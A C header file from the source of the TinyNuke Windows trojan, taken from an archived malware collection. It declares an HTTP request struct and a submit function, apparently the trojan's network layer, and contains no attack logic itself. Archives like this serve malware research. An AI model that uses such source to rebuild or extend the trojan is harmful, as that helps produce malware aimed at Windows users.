/*
  name      TinyNuke
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "Common.h"

struct HttpRequestData
{
   BOOL        post;
   int         port;
   char       *host;
   char       *path;
   BYTE       *inputBody;
   int         inputBodySize;
   BYTE       *outputBody;
   int         outputBodySize;
};

BOOL HttpSubmitRequest(HttpRequestData &httpRequestData);